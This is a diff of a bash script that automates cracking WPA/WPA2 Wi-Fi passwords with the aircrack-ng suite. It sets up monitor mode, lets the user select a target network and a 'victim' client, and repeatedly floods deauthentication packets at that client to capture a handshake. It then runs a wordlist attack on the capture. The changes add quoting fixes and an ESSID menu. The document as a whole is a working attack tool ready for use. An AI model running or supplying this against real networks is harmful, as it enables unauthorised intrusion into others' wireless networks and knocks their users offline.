@@ -5,13 +5,18 @@
 #help yourself...
 #
 #default:wlan0, mon0
-#request: aircrack suite was installed.
+#request: aircrack suite should be installed.
 #
 #make it in kali linux.
 #
 #maybe can add aircrack session function in version2.
 #by needle wang
 #
+#version1.2:
+#change inputing essid to selecting essid.
+#and change grep essid to grep -F essid.
+#2014年 11月 02日 星期日 06:17:02 CST
+
 #version1.1:
 #fixed essid inputed is none or contains blank.
 #added killing aireplay-ng
@@ -24,6 +29,8 @@
 test -f "$1" && test -r "$1" || {
 					echo "need a wordlist file."
 					echo "usage: $0 wordlist.txt"
+					echo "if you don't want crack the capfile now, just give a unuseful file."
+					echo "when the script starts to crack the passwd from capfile, press ctrl-c."
 					exit 1
 				}
 
@@ -44,15 +51,15 @@ fi
 
 replay_for_wpa(){
 #bssid
-ap_mac=$1
+ap_mac="$1"
 #client_mac
-victim_mac=$2
+victim_mac="$2"
 
 sleep 2s
 while true
 do
-	aireplay-ng -0 2 -a $ap_mac -c $victim_mac mon0
-	sleep 6s
+	aireplay-ng -0 2 -a "$ap_mac" -c "$victim_mac" mon0
+	sleep 5s
 done
 }
 
@@ -78,55 +85,65 @@ stop_replay(){
 
 tmpfile=$(mktemp)
 test -e $tmpfile || {
-			echo "can't mktemp"
+			echo "can't mktemp~"
 			exit 1
 		    }
 
-trap "rm -f $tmpfile; echo -e '\nterminated manually...'; exit 2;" INT
+trap "rm -f \"$tmpfile\";airmon-ng stop mon0; echo -e '\nterminated manually...'; exit 2;" INT
 
 monitor_status_str=$(airmon-ng)
 #if there is no monitor, start one.
 #and only use mon0, maybe change it in future. ^||
-echo "${monitor_status_str}" | grep -q mon0 || airmon-ng start ${interface}
+echo "${monitor_status_str}" | grep -q 'mon0' || airmon-ng start "${interface}"
 
-echo 'Now start to capture all, if you think enough after a moment, press ctrl-c.'
+echo 'Now start to capture all.'
+echo "If you think capturing is enough after a moment:"
+echo "  the target's BSSID to which some victims connect displayed in lower block area!"
+echo "press ctrl-c."
 read -ep 'Are you clear? [Press Enter]:'
 
 #don't need trap...
 #trap "pkill airodump-ng;" INT
-airodump-ng mon0 2>&1 | tee $tmpfile
+airodump-ng mon0 2>&1 | tee "$tmpfile"
 
 #trap "rm -f $tmpfile; echo -e '\nterminated manually...'; exit 2;" INT
 
-line_number_at_last_elapsed=$(grep -n 'Elapsed' $tmpfile | tail -n 1 | awk -F':' '{print $1}')
+line_number_at_last_elapsed=$(grep -n 'Elapsed' "$tmpfile" | tail -n 1 | awk -F':' '{print $1}')
 
 #lastline are some strange characters. but I have no idea for deleting this line...
-last_mesg=$(sed -n "${line_number_at_last_elapsed},\$p" $tmpfile)
-echo "$last_mesg" >$tmpfile
+last_mesg=$(sed -n "${line_number_at_last_elapsed},\$p" "$tmpfile")
+echo "$last_mesg" >"$tmpfile"
 
 clear
-echo -e "\n------------- Final message -------------\n"
-cat $tmpfile
+echo -e "\n             ------------- Final message start -------------\n"
+cat "$tmpfile"
+echo -e "\n             ------------- Final message end   -------------\n"
 
-read -ep "which ESSID you wanna crack: " essid
+echo "essid list:"
+essid_list=$(sed -n '/BSSID/,/BSSID/p' "$tmpfile" | tail -n +3 | awk '{for(i=1;i<11;i++)$i="";print}' | sed '/^ *$/d;s/^ *//g' | nl)
+echo "$essid_list"
 
-until [ "${essid}" ] && [ "$(sed -n '/BSSID/,/BSSID/p' $tmpfile | grep " $essid *$")" ]
+read -ep "which ESSID you wanna crack(1,2,3...): " essid_num
+essid=$(echo "$essid_list" | grep -F -- " ${essid_num}	" | cut -d $'\t' -f 2-)
+
+until [ "${essid}" ] && [ "$(sed -n '/BSSID/,/BSSID/p' $tmpfile | grep -F -- " ${essid}   ")" ]
 do
 	echo "input wrong?"
-	read -ep "which ESSID you wanna crack: " essid
+	read -ep "which ESSID you wanna crack(1,2,3...): " essid_num
+    essid=$(echo "$essid_list" | grep -F -- " ${essid_num}	" | cut -d $'\t' -f 2-)
 done
 
 
-channel=$(sed -n '/BSSID/,/BSSID/p' $tmpfile | grep -- "$essid" | awk '{print $6}')
-bssid=$(sed -n '/BSSID/,/BSSID/p' $tmpfile | grep -- "$essid" | awk '{print $1}')
+channel=$(sed -n '/BSSID/,/BSSID/p' "$tmpfile" | grep -F -- "$essid" | awk '{print $6}')
+bssid=$(sed -n '/BSSID/,/BSSID/p' "$tmpfile" | grep -F -- "$essid" | awk '{print $1}')
 
-clients=$(sed -n '/BSSID.*Probe/,$p' $tmpfile | grep -- "$bssid" | awk '{print $2}')
+clients=$(sed -n '/BSSID.*Probe/,$p' "$tmpfile" | grep -F -- "$bssid" | awk '{print $2}')
 
 test "$clients" || {
-			echo -e "\nno clients, you should wait a minute util a client connection."
+			echo -e "\nno clients, you should wait a minute until a client connection."
 			echo "this is the only way to wpa/wpa2."
 			echo "no other tools's authority is more powerful than aircrack!"
-			rm -f $tmpfile
+			rm -f "$tmpfile"
 			exit 1
 		   }
 
@@ -135,7 +152,7 @@ num_client=1
 
 if [ "$clients_count" -gt 1 ]
 then
-	echo "It seems more clients. choose one(1,2,3...) to use for deauthentication:"
+	echo "There are some clients. choose one(1,2,3...) to use for deauthentication:"
 	echo "$clients" | nl
 	read -ep "Enter straightly means the first: " num_client
 	test "$num_client" || num_client=1
@@ -143,13 +160,13 @@ fi
 
 if ! client_inputed_validate "$num_client"
 then
-	echo "I don't wannna code more. please, serious. last one chance!"
+	echo "I don't wannna code more. please, be serious. last one chance!"
 	echo "$clients" | nl
 	read -ep "Enter straightly means the first: " num_client
 	test "$num_client" || num_client=1
 	client_inputed_validate "$num_client" || {
 							echo "Are you kidding?"
-							rm -f $tmpfile
+							rm -f "$tmpfile"
 							exit 38
 						 }
 fi
@@ -162,20 +179,24 @@ AP's channel is ${channel}
 AP's bssid   is ${bssid}
 victim's mac is ${client_mac}\n"
 read -ep "now start to dump and replay will in background.
-If catched a handshake, press ctrl-c, or not, you can also press it for stop.
+If a handshake catched (it just splash one time at top-right), press ctrl-c;
+or not, you can also press it for stopping replay.
+if it's hard to see a handshake, after the dumping has begun,
+you can run aircrack-ng \"essid_${essid}*.cap\" in another terminal to check.
 clear? [Press Enter]: "
 
 trap "stop_replay;" INT
-replay_for_wpa $bssid $client_mac &
+replay_for_wpa "$bssid" "$client_mac" &
 
-airodump-ng -c $channel --bssid $bssid -w "essid_${essid}" mon0
+airodump-ng -c "$channel" --bssid "$bssid" -w "essid_${essid}" mon0
 
-trap "rm -f $tmpfile; echo -e '\nterminated manually...'; exit 2;" INT
+trap "rm -f \"$tmpfile\";airmon-ng stop mon0; echo -e '\nterminated manually...'; exit 2;" INT
 clear
 echo "next, crack the cap file. you can use john, hashcat... by yourself."
-read -ep "here is aircrack-ng -w $wordlistfile essid_${essid}*.cap
+read -ep "here is aircrack-ng -w \"$wordlistfile\" essid_${essid}*.cap
 [Press Enter]: "
-aircrack-ng -w $wordlistfile "essid_${essid}"*.cap
+aircrack-ng -w "$wordlistfile" "essid_${essid}"*.cap
 
-rm -f $tmpfile
+rm -f "$tmpfile"
+airmon-ng stop mon0
 
